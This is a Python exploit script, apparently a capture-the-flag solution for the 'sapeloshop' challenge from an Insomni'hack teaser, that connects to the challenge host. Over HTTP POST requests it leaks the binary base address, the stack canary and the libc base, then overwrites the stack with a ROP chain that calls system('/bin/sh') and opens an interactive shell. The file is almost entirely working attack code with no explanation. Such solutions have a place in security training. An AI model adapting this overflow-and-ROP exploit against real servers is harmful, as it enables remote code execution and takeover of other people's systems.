#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './sapeloshop'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'sapeloshop.teaser.insomnihack.ch', 'port':80})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.23.so')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_main    = libc.sep_function['__libc_start_main']

#==========

def attack(conn):
    '''
    exploit = 'desc=hoge'

    request  = 'POST /add HTTP/1.1\r\n'
    request += 'Content-Length: %d\r\n' % (len(exploit)+2)
    request += 'Connection: keep-alive\r\n'
    request += 'fake_header: a\r\n'*0x3f0
    request += '\r\n\r\n'

    conn.send(request)
    conn.send(exploit)

    conn.recvuntil('<!-- cart content -->')
    conn.recvuntil('<img src="img/')
    canary = u64('\x00'+conn.recv(7))
    '''

    binf.address    = u(leak(conn, 1, 0x3ff8))-0xd10
    info('addr_binf_base    = 0x{:08x}'.format(binf.address))

    canary          = u64('\x00'+leak(conn, 2, 0x4009)[:7])
    info('canary            = 0x{:08x}'.format(canary))

    addr_libc_main  = u(leak(conn, 3, 0x4018)) - 0xf0
    libc.address    = addr_libc_main - offset_libc_main
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.sep_function['system']
    addr_libc_str_sh    = libc.search('/bin/sh').next()

    rop = ROP(binf)
    rop.call(addr_libc_system, [addr_libc_str_sh])

    exploit  = p64(canary)
    exploit += p64(0xdeadbeef)
    exploit += str(rop)
    overwrite(conn, 0x4008, exploit)


def leak(conn, item, offset):
    if offset < 0x4a:
        return None

    nfh = (min(offset, 0x4000) - 0x45 - 10) / 0x10
        
    remain = offset - 0x45 - nfh * 0x10
    exploit  = 'A'*(remain-9)
    exploit += '=B&desc=!'

    request  = 'POST /add HTTP/1.1\r\n'
    request += 'Content-Length: %3d\r\n' % (len(exploit)+2)
    request += 'Connection: keep-alive\r\n'
    request += 'fake_header: a\r\n' * nfh 
    request += '\r\n\r\n'

    conn.send(request)
    sleep(0.1)
    conn.send(exploit)

    for i in range(item):
        conn.recvuntil('<img src="img/!')
    leak_data = conn.recvuntil('" style', drop=True)
    conn.recvuntil('</html>')

    return leak_data

def overwrite(conn, offset, data):
    if offset < 0x2d:
        return None

    nfh = (min(offset, 0x4000) - 0x2d) / 0x10
        
    remain = offset - 0x2d - nfh * 0x10
    exploit  = 'A'*remain
    exploit += data

    request  = 'POST /add HTTP/1.1\r\n'
    request += 'Content-Length: %3d\r\n' % (len(exploit)+2)
    request += 'fake_header: a\r\n' * nfh 
    request += '\r\n\r\n'

    conn.send(request)
    sleep(0.1)
    conn.send(exploit)

    conn.recvuntil('</html>')

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
